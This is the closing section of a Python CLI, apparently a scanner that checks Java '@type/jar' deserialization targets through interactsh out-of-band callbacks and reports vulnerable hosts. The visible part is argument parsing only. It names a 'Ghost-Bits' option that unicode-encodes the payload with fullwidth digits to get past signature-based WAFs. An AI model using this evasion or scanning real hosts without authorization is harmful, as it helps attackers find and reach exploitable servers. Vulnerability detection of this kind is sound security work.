                       help="probe targets out-of-band and report which are vulnerable (detect only)")
    p.add_argument("-o", "--oob", default=env_oob, required=env_oob is None,
                   help="interactsh OOB base URL (must be IPv4, no domain), "
                        "e.g. http://203.0.113.10:50050 (env OOB_URL)")
    p.add_argument("-t", "--target", action="append", default=[],
                   help="full target URL to test, incl. path (repeatable)")
    p.add_argument("-f", "--file", help="FILE with one target URL per line")
    p.add_argument("-H", "--header", action="append", default=[], metavar="'Name: Value'",
                   help="extra request header, curl-style (repeatable)")
    p.add_argument("-x", "--proxy",
                   help="route target requests through a PROXY (http/https, e.g. http://127.0.0.1:8080)")
    p.add_argument("--ghost", action="store_true",
                   help="Ghost-Bits: \\u-encode @type/jar with fullwidth digits to evade signature WAFs")
    p.add_argument("--entry", default="POC", help="jar entry base NAME (cosmetic; not sent over HTTP)")
    p.add_argument("--timeout", type=parse_duration, default="8s", metavar="DURATION",
                   help="per-request HTTP timeout (default 8s)")
    p.add_argument("--wait", type=parse_duration, default="10s", metavar="DURATION",
                   help="how long to poll for OOB callbacks after sending (default 10s)")
    p.add_argument("--interval", type=parse_duration, default="2s", metavar="DURATION",
                   help="poll interval (default 2s)")
    p.add_argument("-v", "--verbose", action="store_true", help="print each payload and poll errors")
    p.set_defaults(func=cmd_scan)

    return parser


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
